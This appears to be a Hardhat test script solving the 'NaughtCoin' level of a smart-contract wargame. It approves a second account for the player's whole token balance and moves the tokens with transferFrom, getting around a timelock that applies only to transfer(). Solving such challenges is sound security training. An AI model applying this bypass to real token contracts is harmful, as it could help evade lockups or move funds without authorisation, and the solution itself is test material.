const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("NaughtCoin", async function () {
    let deployer;
    let player;
    let friend;
    let factory;
    let instance;

    before(async function () {
        [deployer, player, friend] = await ethers.getSigners();

        level = await setupLevel("NaughtCoin", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        const bal = await instance.balanceOf(player.address);
        await instance.connect(player).approve(friend.address, bal);
        await instance.connect(friend).transferFrom(player.address, friend.address, bal);
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});